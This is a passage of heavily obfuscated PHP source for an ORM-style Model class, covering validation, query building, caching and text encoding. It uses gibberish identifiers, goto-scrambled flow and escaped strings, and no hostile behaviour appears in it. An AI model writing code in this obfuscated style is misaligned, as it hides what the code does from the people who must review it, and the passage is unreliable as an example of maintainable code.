array(); if (isset($fĞğŞÃ‘ò—[$D‡©øË•[0]])) { array_unshift($E©…Ë—È‡, $fĞğŞÃ‘ò—[$D‡©øË•[0]]); } if ($AÃÜãô†œ²[318] == $D‡©øË•[3]) { $fĞğŞÃ‘ò—[$D‡©øË•[0]] = call_user_func_array($D‡©øË•[1], $E©…Ë—È‡); } else { $fĞğŞÃ‘ò—[$D‡©øË•[0]] = call_user_func_array(array(&$this, $D‡©øË•[1]), $E©…Ë—È‡); } break; case $AÃÜãô†œ²[270]: $fĞğŞÃ‘ò—[$D‡©øË•[0]] = $fĞğŞÃ‘ò—[$D‡©øË•[1]]; break; case $AÃÜãô†œ²[320]: if ($AÃÜãô†œ²[43] === $fĞğŞÃ‘ò—[$D‡©øË•[0]]) { unset($fĞğŞÃ‘ò—[$D‡©øË•[0]]); } break; case $AÃÜãô†œ²[321]: default: $fĞğŞÃ‘ò—[$D‡©øË•[0]] = $D‡©øË•[1]; } if (!1 === $fĞğŞÃ‘ò—[$D‡©øË•[0]]) { unset($fĞğŞÃ‘ò—[$D‡©øË•[0]]); } } } } return $fĞğŞÃ‘ò—; } protected function autoValidation($Déêë”ÍÚĞ, $a±Ñë‡ˆî) { $CŒÚàÆŠ‘é =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($this->options[$CŒÚàÆŠ‘é[322]])) { $a¯ÎáÍí‡ó = $this->options[$CŒÚàÆŠ‘é[322]]; unset($this->options[$CŒÚàÆŠ‘é[322]]); } elseif (!empty($this->_validate)) { $a¯ÎáÍí‡ó = $this->_validate; } if (isset($a¯ÎáÍí‡ó)) { if ($this->patchValidate) { $this->error = array(); } foreach ($a¯ÎáÍí‡ó as $f»¼¤‚ŸíÊ => $E„İ‡ÇË‰Ã) { if (empty($E„İ‡ÇË‰Ã[5]) || $E„İ‡ÇË‰Ã[5] == THINK_MODEL_BOTH || $E„İ‡ÇË‰Ã[5] == $a±Ñë‡ˆî) { if (0 == strpos($E„İ‡ÇË‰Ã[2], $CŒÚàÆŠ‘é[323]) && strpos($E„İ‡ÇË‰Ã[2], $CŒÚàÆŠ‘é[324])) { $E„İ‡ÇË‰Ã[2] = think_lang(substr($E„İ‡ÇË‰Ã[2], 2, -1)); } $E„İ‡ÇË‰Ã[3] = isset($E„İ‡ÇË‰Ã[3]) ? $E„İ‡ÇË‰Ã[3] : THINK_EXISTS_VALIDATE; $E„İ‡ÇË‰Ã[4] = isset($E„İ‡ÇË‰Ã[4]) ? $E„İ‡ÇË‰Ã[4] : $CŒÚàÆŠ‘é[325]; switch ($E„İ‡ÇË‰Ã[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Déêë”ÍÚĞ, $E„İ‡ÇË‰Ã)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CŒÚàÆŠ‘é[43] != trim($Déêë”ÍÚĞ[$E„İ‡ÇË‰Ã[0]])) { if (!1 === $this->_validationField($Déêë”ÍÚĞ, $E„İ‡ÇË‰Ã)) { return !1; } } break; default: if (isset($Déêë”ÍÚĞ[$E„İ‡ÇË‰Ã[0]])) { if (!1 === $this->_validationField($Déêë”ÍÚĞ, $E„İ‡ÇË‰Ã)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E÷¸Şø‰È‚, $eã¸°£×´) { if (!1 === $this->_validationFieldItem($E÷¸Şø‰È‚, $eã¸°£×´)) { if ($this->patchValidate) { $this->error[$eã¸°£×´[0]] = $eã¸°£×´[2]; } else { $this->error = $eã¸°£×´[2]; return !1; } } return; } protected function _validationFieldItem($bë½âè–Ü, $C‡Ç ¤˜±) { $cˆ“ŠÒ«“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; switch (strtolower(trim($C‡Ç ¤˜±[4]))) { case $cˆ“ŠÒ«“[318]: case $cˆ“ŠÒ«“[319]: $aùõíâŒ‹ = isset($C‡Ç ¤˜±[6]) ? (array) $C‡Ç ¤˜±[6] : array(); if (is_string($C‡Ç ¤˜±[0]) && strpos($C‡Ç ¤˜±[0], $cˆ“ŠÒ«“[57])) { $C‡Ç ¤˜±[0] = explode($cˆ“ŠÒ«“[57], $C‡Ç ¤˜±[0]); } if (is_array($C‡Ç ¤˜±[0])) { foreach ($C‡Ç ¤˜±[0] as $B…”õ‚‚²‘) { $Aª‚‹ô¤š[$B…”õ‚‚²‘] = $bë½âè–Ü[$B…”õ‚‚²‘]; } array_unshift($aùõíâŒ‹, $Aª‚‹ô¤š); } else { array_unshift($aùõíâŒ‹, $bë½âè–Ü[$C‡Ç ¤˜±[0]]); } if ($cˆ“ŠÒ«“[318] == $C‡Ç ¤˜±[4]) { return call_user_func_array($C‡Ç ¤˜±[1], $aùõíâŒ‹); } else { return call_user_func_array(array(&$this, $C‡Ç ¤˜±[1]), $aùõíâŒ‹); } case $cˆ“ŠÒ«“[326]: return $bë½âè–Ü[$C‡Ç ¤˜±[0]] == $bë½âè–Ü[$C‡Ç ¤˜±[1]]; case $cˆ“ŠÒ«“[327]: if (is_string($C‡Ç ¤˜±[0]) && strpos($C‡Ç ¤˜±[0], $cˆ“ŠÒ«“[57])) { $C‡Ç ¤˜±[0] = explode($cˆ“ŠÒ«“[57], $C‡Ç ¤˜±[0]); } $BÄ»‘¾ğ’ = array(); if (is_array($C‡Ç ¤˜±[0])) { foreach ($C‡Ç ¤˜±[0] as $B…”õ‚‚²‘) { $BÄ»‘¾ğ’[$B…”õ‚‚²‘] = $bë½âè–Ü[$B…”õ‚‚²‘]; } } else { $BÄ»‘¾ğ’[$C‡Ç ¤˜±[0]] = $bë½âè–Ü[$C‡Ç ¤˜±[0]]; } if (!empty($bë½âè–Ü[$this->getPk()])) { $BÄ»‘¾ğ’[$this->getPk()] = array($cˆ“ŠÒ«“[328], $bë½âè–Ü[$this->getPk()]); } if ($this->where($BÄ»‘¾ğ’)->find()) { return !1; } return !0; default: return $this->check($bë½âè–Ü[$C‡Ç ¤˜±[0]], $C‡Ç ¤˜±[1], $C‡Ç ¤˜±[4]); } } public function check($d¥¦Œé¿µ÷, $C‹¹·¦Ô…, $BÑ™á•…‚‡ = "\162\x65\x67\x65\x78") { $F¸·ê„£Šƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÑ™á•…‚‡ = strtolower(trim($BÑ™á•…‚‡)); switch ($BÑ™á•…‚‡) { case $F¸·ê„£Šƒ[17]: case $F¸·ê„£Šƒ[329]: $fôà†Ò™ô = is_array($C‹¹·¦Ô…) ? $C‹¹·¦Ô… : explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…); return $BÑ™á•…‚‡ == $F¸·ê„£Šƒ[17] ? in_array($d¥¦Œé¿µ÷, $fôà†Ò™ô) : !in_array($d¥¦Œé¿µ÷, $fôà†Ò™ô); case $F¸·ê„£Šƒ[330]: case $F¸·ê„£Šƒ[331]: if (is_array($C‹¹·¦Ô…)) { $BÏ¤†ï…½Ğ = $C‹¹·¦Ô…[0]; $cš•ËÂõ¼± = $C‹¹·¦Ô…[1]; } else { list($BÏ¤†ï…½Ğ, $cš•ËÂõ¼±) = explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…); } return $BÑ™á•…‚‡ == $F¸·ê„£Šƒ[330] ? $d¥¦Œé¿µ÷ >= $BÏ¤†ï…½Ğ && $d¥¦Œé¿µ÷ <= $cš•ËÂõ¼± : $d¥¦Œé¿µ÷ < $BÏ¤†ï…½Ğ || $d¥¦Œé¿µ÷ > $cš•ËÂõ¼±; case $F¸·ê„£Šƒ[332]: case $F¸·ê„£Šƒ[333]: return $BÑ™á•…‚‡ == $F¸·ê„£Šƒ[332] ? $d¥¦Œé¿µ÷ == $C‹¹·¦Ô… : $d¥¦Œé¿µ÷ != $C‹¹·¦Ô…; case $F¸·ê„£Šƒ[334]: $fÛñÁ¥Ş»ñ = mb_strlen($d¥¦Œé¿µ÷, $F¸·ê„£Šƒ[335]); if (strpos($C‹¹·¦Ô…, $F¸·ê„£Šƒ[57])) { list($BÏ¤†ï…½Ğ, $cš•ËÂõ¼±) = explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…); return $fÛñÁ¥Ş»ñ >= $BÏ¤†ï…½Ğ && $fÛñÁ¥Ş»ñ <= $cš•ËÂõ¼±; } else { return $fÛñÁ¥Ş»ñ == $C‹¹·¦Ô…; } case $F¸·ê„£Šƒ[336]: list($eÆ‰¾áŒÄè, $BÏÉŸà¯È™) = explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…); if (!is_numeric($eÆ‰¾áŒÄè)) { $eÆ‰¾áŒÄè = strtotime($eÆ‰¾áŒÄè); } if (!is_numeric($BÏÉŸà¯È™)) { $BÏÉŸà¯È™ = strtotime($BÏÉŸà¯È™); } return NOW_TIME >= $eÆ‰¾áŒÄè && NOW_TIME <= $BÏÉŸà¯È™; case $F¸·ê„£Šƒ[337]: return in_array(get_client_ip(), explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…)); case $F¸·ê„£Šƒ[338]: return !in_array(get_client_ip(), explode($F¸·ê„£Šƒ[57], $C‹¹·¦Ô…)); case $F¸·ê„£Šƒ[325]: default: return $this->regex($d¥¦Œé¿µ÷, $C‹¹·¦Ô…); } } public function query($Cƒ¢Ó¤êÓ¾, $EëÊˆ¥ÊŒµ = false) { $BæÓ¢ù±—î =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_bool($EëÊˆ¥ÊŒµ) && !is_array($EëÊˆ¥ÊŒµ)) { $EëÊˆ¥ÊŒµ = func_get_args(); array_shift($EëÊˆ¥ÊŒµ); } $Cƒ¢Ó¤êÓ¾ = str_replace(array($BæÓ¢ù±—î[11], $BæÓ¢ù±—î[339]), $BæÓ¢ù±—î[60], $Cƒ¢Ó¤êÓ¾); $Cƒ¢Ó¤êÓ¾ = $this->parseSql($Cƒ¢Ó¤êÓ¾, $EëÊˆ¥ÊŒµ); return $this->db->query($Cƒ¢Ó¤êÓ¾); } public function execute($eÀï×ñöÜ, $eÆ©Ï±ãˆï = false) { if (!is_bool($eÆ©Ï±ãˆï) && !is_array($eÆ©Ï±ãˆï)) { $eÆ©Ï±ãˆï = func_get_args(); array_shift($eÆ©Ï±ãˆï); } $eÀï×ñöÜ = $this->parseSql($eÀï×ñöÜ, $eÆ©Ï±ãˆï); return $this->db->execute($eÀï×ñöÜ); } protected function parseSql($aï¿Á²‚š¾, $D‰»Á®Ù¦ô) { $dºõ‘­³¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!0 === $D‰»Á®Ù¦ô) { $d¢İŸ¸º‘Ù = $this->_parseOptions(); $aï¿Á²‚š¾ = $this->db->parseSql($aï¿Á²‚š¾, $d¢İŸ¸º‘Ù); } elseif (is_array($D‰»Á®Ù¦ô)) { $D‰»Á®Ù¦ô = array_map(array($this->db, $dºõ‘­³¬[340]), $D‰»Á®Ù¦ô); $aï¿Á²‚š¾ = vsprintf($aï¿Á²‚š¾, $D‰»Á®Ù¦ô); } else { $aï¿Á²‚š¾ = strtr($aï¿Á²‚š¾, array($dºõ‘­³¬[341] => $this->getTableName(), $dºõ‘­³¬[342] => think_config($dºõ‘­³¬[241]))); } $this->db->setModel($this->name); return $aï¿Á²‚š¾; } public function db($F³…ªİ™õ = '', $B˜±‘ŒÁ = '', $dâ™Ûàç¾ = array()) { goto AŒÃÅŸ„Ëö; AŒÃÅŸ„Ëö: $Aƒ»‘ƒ¡˜ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Aƒ»‘ƒ¡˜ó[43] === $F³…ªİ™õ && $this->db) { return $this->db; } static $fóƒ©ˆóÁå = array(); goto Fë—öÎÉÎ°; f’»ô—Œ…ë: $fóƒ©ˆóÁå[$F³…ªİ™õ] = $B˜±‘ŒÁ; $this->db = $Få­Ç´Š[$F³…ªİ™õ]; $this->_after_db(); goto BåÄµ­í‰; Fë—öÎÉÎ°: static $Få­Ç´Š = array(); if (!isset($Få­Ç´Š[$F³…ªİ™õ]) || isset($Få­Ç´Š[$F³…ªİ™õ]) && $B˜±‘ŒÁ && $fóƒ©ˆóÁå[$F³…ªİ™õ] != $B˜±‘ŒÁ) { if (!empty($B˜±‘ŒÁ) && is_string($B˜±‘ŒÁ) && !1 === strpos($B˜±‘ŒÁ, $Aƒ»‘ƒ¡˜ó[18])) { $B˜±‘ŒÁ = think_config($B˜±‘ŒÁ); } $Få­Ç´Š[$F³…ªİ™õ] = Db::getInstance($B˜±‘ŒÁ); } elseif (NULL === $B˜±‘ŒÁ) { $Få­Ç´Š[$F³…ªİ™õ]->close(); unset($Få­Ç´Š[$F³…ªİ™õ]); return; } if (!empty($dâ™Ûàç¾)) { if (is_string($dâ™Ûàç¾)) { parse_str($dâ™Ûàç¾, $dâ™Ûàç¾); } foreach ($dâ™Ûàç¾ as $a –—„Áš => $dÀèÅ˜ïÒÜ) { $this->setProperty($a –—„Áš, $dÀèÅ˜ïÒÜ); } } goto f’»ô—Œ…ë; BåÄµ­í‰: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DÍÃ“¬¤–; DÍÃ“¬¤–: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eÓòÑ¼ÄÂ = get_class($this); if ($eÓòÑ¼ÄÂ == $_SERVER[çŞáÓæÚô‚Ô‡][343]) { return $this->name; } $this->name = substr($eÓòÑ¼ÄÂ, 0, -5); } return $this->name; } public function getTableName() { $F³…åÈ¡å =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($this->trueTableName)) { $aĞ‘š¶’¬Ÿ = !empty($this->tablePrefix) ? $this->tablePrefix : $F³…åÈ¡å[43]; if (!empty($this->tableName)) { $aĞ‘š¶’¬Ÿ .= $this->tableName; } else { $aĞ‘š¶’¬Ÿ .= think_parse_name($this->name); } $this->trueTableName = strtolower($aĞ‘š¶’¬Ÿ); } return (!empty($this->dbName) ? $this->dbName . $F³…åÈ¡å[101] : $F³…åÈ¡å[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $cÛÇáˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return isset($this->fields[$cÛÇáˆ[248]]) ? $this->fields[$cÛÇáˆ[248]] : $this->pk; } public function getDbFields() { $dÍ²ˆçéŠ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($this->options[$dÍ²ˆçéŠ‹[276]])) { $AÕÓÏ´õÒò = $this->db->getFields($this->options[$dÍ²ˆçéŠ‹[276]]); return $AÕÓÏ´õÒò ? array_keys($AÕÓÏ´õÒò) : !1; } if ($this->fields) { $AÕÓÏ´õÒò = $this->fields; unset($AÕÓÏ´õÒò[$dÍ²ˆçéŠ‹[247]], $AÕÓÏ´õÒò[$dÍ²ˆçéŠ‹[248]], $AÕÓÏ´õÒò[$dÍ²ˆçéŠ‹[249]], $AÕÓÏ´õÒò[$dÍ²ˆçéŠ‹[246]]); return $AÕÓÏ´õÒò; } return !1; } public function data($c÷†Ûø•§ = '') { $Bö¹ãÏÃ¿á =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Bö¹ãÏÃ¿á[43] === $c÷†Ûø•§ && !empty($this->data)) { return $this->data; } if (is_object($c÷†Ûø•§)) { $c÷†Ûø•§ = get_object_vars($c÷†Ûø•§); } elseif (is_string($c÷†Ûø•§)) { parse_str($c÷†Ûø•§, $c÷†Ûø•§); } elseif (!is_array($c÷†Ûø•§)) { think_exception(think_lang($Bö¹ãÏÃ¿á[268])); } $this->data = $c÷†Ûø•§; return $this; } public function join($f¿ßô½¹êõ) { $CíÙ´ÀÑƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($f¿ßô½¹êõ)) { $this->options[$CíÙ´ÀÑƒ[279]] = $f¿ßô½¹êõ; } elseif (!empty($f¿ßô½¹êõ)) { $this->options[$CíÙ´ÀÑƒ[279]][] = $f¿ßô½¹êõ; } return $this; } public function union($b‡‘ôŠ·†–, $A½áÙó”…» = false) { goto fØ¶ã§·àÑ; aç™Ãëª§Á: return $this; goto AæÑÉáæ­; F·Ú¡é³„Ë: if (is_object($b‡‘ôŠ·†–)) { $b‡‘ôŠ·†– = get_object_vars($b‡‘ôŠ·†–); } if (is_string($b‡‘ôŠ·†–)) { $e†ƒĞßõ£Ñ = $b‡‘ôŠ·†–; } elseif (is_array($b‡‘ôŠ·†–)) { if (isset($b‡‘ôŠ·†–[0])) { $this->options[$fâ¤ÉÏò£[344]] = array_merge($this->options[$fâ¤ÉÏò£[344]], $b‡‘ôŠ·†–); return $this; } else { $e†ƒĞßõ£Ñ = $b‡‘ôŠ·†–; } } else { think_exception(think_lang($fâ¤ÉÏò£[268])); } $this->options[$fâ¤ÉÏò£[344]][] = $e†ƒĞßõ£Ñ; goto aç™Ãëª§Á; fØ¶ã§·àÑ: $fâ¤ÉÏò£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($b‡‘ôŠ·†–)) { return $this; } if ($A½áÙó”…») { $this->options[$fâ¤ÉÏò£[344]][$fâ¤ÉÏò£[345]] = !0; } goto F·Ú¡é³„Ë; AæÑÉáæ­: } public function cache($aäğºœĞÜ = true, $fß½íê™§ = null, $E•‡†·ò¶ = '') { $FÕÈÉèóÃŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!1 !== $aäğºœĞÜ) { $this->options[$FÕÈÉèóÃŒ[346]] = array($FÕÈÉèóÃŒ[99] => $aäğºœĞÜ, $FÕÈÉèóÃŒ[336] => $fß½íê™§, $FÕÈÉèóÃŒ[39] => $E•‡†·ò¶); } return $this; } public function field($bµˆÓÒ¥Ë‰, $aƒÂš•©ºê = false) { $AñÒÊ†«œ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!0 === $bµˆÓÒ¥Ë‰) { $c–š½Ç›ºÏ = $this->getDbFields(); $bµˆÓÒ¥Ë‰ = $c–š½Ç›ºÏ ? $c–š½Ç›ºÏ : $AñÒÊ†«œ¥[186]; } elseif ($aƒÂš•©ºê) { if (is_string($bµˆÓÒ¥Ë‰)) { $bµˆÓÒ¥Ë‰ = explode($AñÒÊ†«œ¥[57], $bµˆÓÒ¥Ë‰); } $c–š½Ç›ºÏ = $this->getDbFields(); $bµˆÓÒ¥Ë‰ = $c–š½Ç›ºÏ ? array_diff($c–š½Ç›ºÏ, $bµˆÓÒ¥Ë‰) : $bµˆÓÒ¥Ë‰; } $this->options[$AñÒÊ†«œ¥[270]] = $bµˆÓÒ¥Ë‰; return $this; } public function scope($d›¤ÖŠ¦õ = '', $dÛÔõ¦£Àâ = NULL) { $dŞò§ÁîàÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($dŞò§ÁîàÄ[43] === $d›¤ÖŠ¦õ) { if (isset($this->_scope[$dŞò§ÁîàÄ[44]])) { $DÌëÔÇÅ˜ = $this->_scope[$dŞò§ÁîàÄ[44]]; } else { return $this; } } elseif (is_string($d›¤ÖŠ¦õ)) { $C”ŠÅ¼·¢ = explode($dŞò§ÁîàÄ[57], $d›¤ÖŠ¦õ); $DÌëÔÇÅ˜ = array(); foreach ($C”ŠÅ¼·¢ as $fŞÛä©Œ) { if (!isset($this->_scope[$fŞÛä©Œ])) { continue; } $DÌëÔÇÅ˜ = array_merge($DÌëÔÇÅ˜, $this->_scope[$fŞÛä©Œ]); } if (!empty($dÛÔõ¦£Àâ) && is_array($dÛÔõ¦£Àâ)) { $DÌëÔÇÅ˜ = array_merge($DÌëÔÇÅ˜, $dÛÔõ¦£Àâ); } } elseif (is_array($d›¤ÖŠ¦õ)) { $DÌëÔÇÅ˜ = $d›¤ÖŠ¦õ; } if (is_array($DÌëÔÇÅ˜) && !empty($DÌëÔÇÅ˜)) { $this->options = array_merge($this->options, array_change_key_case($DÌëÔÇÅ˜)); } return $this; } public function where($eºŸºô¨œº, $E¸§¶ß” = null) { $dÌ£½ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_null($E¸§¶ß”) && is_string($eºŸºô¨œº)) { if (!is_array($E¸§¶ß”)) { $E¸§¶ß” = func_get_args(); array_shift($E¸§¶ß”); } $E¸§¶ß” = array_map(array($this->db, $dÌ£½ƒ[340]), $E¸§¶ß”); $eºŸºô¨œº = vsprintf($eºŸºô¨œº, $E¸§¶ß”); } elseif (is_object($eºŸºô¨œº)) { $eºŸºô¨œº = get_object_vars($eºŸºô¨œº); } elseif (is_array($eºŸºô¨œº)) { foreach ($eºŸºô¨œº as $CÇŸÌ‹¢ï÷ => $F¶óÌ—ë) { if ((is_numeric($CÇŸÌ‹¢ï÷) || !$CÇŸÌ‹¢ï÷) && is_string($F¶óÌ—ë)) { think_trace($dÌ£½ƒ[347], $dÌ£½ƒ[43], $dÌ£½ƒ[56]); die; } } } if (is_string($eºŸºô¨œº) && $dÌ£½ƒ[43] != $eºŸºô¨œº) { $aŠã¾ØŒÙ› = array(); $aŠã¾ØŒÙ›[$dÌ£½ƒ[348]] = $eºŸºô¨œº; $eºŸºô¨œº = $aŠã¾ØŒÙ›; } if (isset($this->options[$dÌ£½ƒ[272]])) { $this->options[$dÌ£½ƒ[272]] = array_merge($this->options[$dÌ£½ƒ[272]], $eºŸºô¨œº); } else { $this->options[$dÌ£½ƒ[272]] = $eºŸºô¨œº; } return $this; } public function limit($d„¹Æƒ’Á¶, $DÙŒ‡®°ƒ = null) { $BÍË×Ãø¥Å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->options[$BÍË×Ãø¥Å[289]] = is_null($DÙŒ‡®°ƒ) ? $d„¹Æƒ’Á¶ : $d„¹Æƒ’Á¶ . $BÍË×Ãø¥Å[57] . $DÙŒ‡®°ƒ; return $this; } public function page($bÀ˜£¯Óùİ, $a‘…Õìœ© = null) { $EµæÅ¤¸í– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->options[$EµæÅ¤¸í–[349]] = is_null($a‘…Õìœ©) ? $bÀ˜£¯Óùİ : $bÀ˜£¯Óùİ . $EµæÅ¤¸í–[57] . $a‘…Õìœ©; return $this; } public function comment($AğÍ‡‰¸í) { $this->options[$_SERVER[çŞáÓæÚô‚Ô‡][350]] = $AğÍ‡‰¸í; return $this; } public function setProperty($b®ƒ¤™––¿, $Cõ˜½‹½¤Ø) { if (property_exists($this, $b®ƒ¤™––¿)) { $this->{$b®ƒ¤™––¿} = $Cõ˜½‹½¤Ø; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\x54\151\155\x65", "\x74\151\x6d\145", "\151\156\163\145\162\164\54\x75\160\x64\141\x74\x65", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\162\x65\x61\x74\145\x54\151\155\145", "\164\151\155\145", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156")); public function setDataAuto($d­…ô»Ö“) { $this->dataAuto = $d­…ô»Ö“; } public function __construct($dÍñ˜¸’«ù = '', $E–Æ÷âéÌ = '', $c¼¥ğƒ¤¬Ï = '') { parent::__construct($dÍñ˜¸’«ù, $E–Æ÷âéÌ, $c¼¥ğƒ¤¬Ï); } public static function textEncode($fÏ†æ’º×¦) { if (!$fÏ†æ’º×¦) { return $fÏ†æ’º×¦; } $e‰®İó—•ó = json_encode($fÏ†æ’º×¦); $e‰®İó—•ó = preg_replace_callback($_SERVER[çŞáÓæÚô‚Ô‡][351], function ($AÎÄéò›Ò®) { return addslashes($AÎÄéò›Ò®[0]); }, $e‰®İó—•ó); return json_decode($e‰®İó—•ó); } public static function textDecode($D¥Çñ±áÙÍ) { $e£Ì©³èŠ× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C÷õŠŒŸ‘† = json_encode($D¥Çñ±áÙÍ); $C÷õŠŒŸ‘† = preg_replace_callback($e£Ì©³èŠ×[352], function ($E¹³Œ½“Ôè) { return $_SERVER[çŞáÓæÚô‚Ô‡][103]; }, $C÷õŠŒŸ‘†); return json_decode($C÷õŠŒŸ‘†); } protected $tableMeta = array(); protected function _beforeInsert(&$E¹¬ÜîùÎŒ, $d»Ë¢ŒÛ ) { $A…à¬½…Å =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->checkDataAutoHas($A…à¬½…Å[353])) { return; } $this->dataBeforeFilter($E¹¬ÜîùÎŒ, $A…à¬½…Å[353]); } protected function _beforeUpdate(&$Cõ¨Ü”ÆÉ, $f®ÎŠŞíÁÓ) { $E³ƒ†Õõé‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->checkDataAutoHas($E³ƒ†Õõé‰[354])) { return; } $this->dataBeforeFilter($Cõ¨Ü”ÆÉ, $E³ƒ†Õõé‰[354]); } protected function _afterSelect(&$D±Úâùâˆİ, $b‡Üä¾Ú) { if (!is_array($D±Úâùâˆİ)) { return; } if (!$this->checkDataAutoHas($_SERVER[çŞáÓæÚô‚Ô‡][355])) { return; } foreach ($D±Úâùâˆİ as &$d‘µƒò‚†) { $this->dataAfterFilter($d‘µƒò‚†); } unset($d‘µƒò‚†); } protected function _afterFind(&$Eóµˆ¨–Âª, $F„ÚöÆµµÉ) { if (!is_array($Eóµˆ¨–Âª)) { return; } if (!$this->checkDataAutoHas($_SERVER[çŞáÓæÚô‚Ô‡][355])) { return; } $this->dataAfterFilter($Eóµˆ¨–Âª); } public function setAutoIncrement($f£Ÿ“Òø¥Ö) { $F¬Ÿ¯‰à»© = array($this->getPk() => $f£Ÿ“Òø¥Ö); $bÜ±‚’Ú¥ = $this->data($F¬Ÿ¯‰à»©)->add(); if ($bÜ±‚’Ú¥) { $this->delete($bÜ±‚’Ú¥); } } public function getAutoIncrement() { $fø¶‡Î…ó† = $this->getTableName(); $A™ì‚ÓÜÔ’ = $this->max($this->getPk()); $D—Ã†â©Îİ = $this->query("\163\x68\x6f\167\x20\x74\141\142\154\145\x20\163\x74\x61\x74\x75\163\40\x77\x68\x65\162\145\40\x4e\141\x6d\145\x3d\x27{$fø¶‡Î…ó†}\x27"); $dê±«¡®ó = $D—Ã†â©Îİ[0][$_SERVER[çŞáÓæÚô‚Ô‡][356]]; $D§„å´œ½‚ = max($A™ì‚ÓÜÔ’, $dê±«¡®ó); return $D§„å´œ½‚; } protected function _callBefore($dáÚ§èÇ‘, $C›ÍÍô’¤Ò) { return $this->cacheCallCheck($dáÚ§èÇ‘, $C›ÍÍô’¤Ò, !1); } protected function _callAfter($eÉ–‘­¢¶, $d¤õ›æ‘„Š) { return $this->cacheCallCheck($eÉ–‘­¢¶, $d¤õ›æ‘„Š, !0); } protected function cacheFunctionAlias($Fô–ÛÉ¸¬ğ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Fµ«Ò·äñá, $E”±º•øõµ, $DÇšËÒì÷ = false) { $fË‹÷³êîÉ = $this->cacheFunctionAlias($E”±º•øõµ); if (!$fË‹÷³êîÉ) { return; } foreach ($fË‹÷³êîÉ as $fˆº®Áõ => $fœ§å½‰Ø) { $DãÙÌ‰¢Ë« = $fœ§å½‰Ø[0]; $F‘îØºˆ†œ = explode($_SERVER[çŞáÓæÚô‚Ô‡][57], $fœ§å½‰Ø[1]); if ($Fµ«Ò·äñá == $fˆº®Áõ) { return $this->cacheFunctionGet($fˆº®Áõ, $DãÙÌ‰¢Ë«); } if ($DÇšËÒì÷ && in_array($Fµ«Ò·äñá, $F‘îØºˆ†œ)) { $this->cacheFunctionClear($fˆº®Áõ, $DãÙÌ‰¢Ë«); } } } public function cacheFunctionGet($Aİê¬”Áëî, $A‰‡À‹±– ) { $b…³Ò®Ò© = $this->cacheKeyMake($Aİê¬”Áëî, $A‰‡À‹±– ); $D×¸ÎË–ñ = Cache::get($b…³Ò®Ò©); if (!is_array($D×¸ÎË–ñ)) { $D×¸ÎË–ñ = call_user_func_array(array($this, $Aİê¬”Áëî), array($A‰‡À‹±– , !0)); Cache::set($b…³Ò®Ò©, $D×¸ÎË–ñ); } return $D×¸ÎË–ñ; } public function cacheFunctionClear($Aœ¢“ñ³—, $E÷š†Ê‘é) { $eµÈ”“°àë = $E÷š†Ê‘é; if (!is_array($E÷š†Ê‘é)) { $eµÈ”“°àë = array($E÷š†Ê‘é); } foreach ($eµÈ”“°àë as $F«‘Ï¨öí) { $CØ«ˆŠÛç = $this->cacheKeyMake($Aœ¢“ñ³—, $F«‘Ï¨öí); Cache::remove($CØ«ˆŠÛç); } } private function cacheKeyMake($FËÀŠìÜ¬Œ, $Câ‡Íß×”‹) { $a›äÜÏ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return get_class($this) . $a›äÜÏ‹[80] . $FËÀŠìÜ¬Œ . $a›äÜÏ‹[357] . $Câ‡Íß×”‹; } protected function selectPage($c‰ô¶‡º±÷ = 200, $bµÄÖ§­±Û = 1) { goto C‘ù–à„º„; b„´›°›±: if ($f¼®¼‚Ü‚Ù == 1) { $c÷‘Õ²Šî = count($D²Úšñ‰ó­); } $Eœ¼Ûé‡Ù© = array($A©ˆÇŠá[360] => array($A©ˆÇŠá[361] => $c÷‘Õ²Šî, $A©ˆÇŠá[358] => $c‰ô¶‡º±÷, $A©ˆÇŠá[349] => $bµÄÖ§­±Û, $A©ˆÇŠá[362] => $f¼®¼‚Ü‚Ù), $A©ˆÇŠá[363] => $D²Úšñ‰ó­ ? $D²Úšñ‰ó­ : array()); return $Eœ¼Ûé‡Ù©; goto AîŞªßœî‡; dÇÊÈİİ²: $f¼®¼‚Ü‚Ù 